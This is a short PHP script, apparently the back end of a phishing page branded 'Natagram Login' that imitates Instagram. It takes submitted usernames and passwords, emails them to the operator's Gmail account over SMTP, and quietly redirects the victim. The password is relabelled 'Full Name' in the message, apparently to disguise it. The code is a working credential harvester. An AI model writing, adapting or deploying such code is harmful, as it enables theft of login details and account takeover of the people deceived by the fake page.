<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


require __DIR__ . '/PHPMailer/Exception.php';
require __DIR__ . '/PHPMailer/PHPMailer.php';
require __DIR__ . '/PHPMailer/SMTP.php';


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
$username = htmlspecialchars($_POST['username'] ?? '');
$password = htmlspecialchars($_POST['password'] ?? '');


if ($username === '' || $password === '') {
header('Location: index.html');
exit;
}


$mail = new PHPMailer(true);
try {
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = getenv('GMAIL_USER'); // Replit Secret
$mail->Password = getenv('GMAIL_PASS'); // Replit Secret
$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
$mail->Port = 587;


$mail->setFrom($mail->Username, 'Natagram Login');
$mail->addAddress($mail->Username);


$mail->isHTML(true);
$mail->Subject = 'New User Submission';
$mail->Body = "<h3>New Data</h3><p><b>Username:</b> {$username}</p><p><b>Full Name:</b> {$password}</p>";


$mail->send();
header('Location: index.html');
exit;
} catch (Exception $e) {
echo 'Mailer Error';
}
}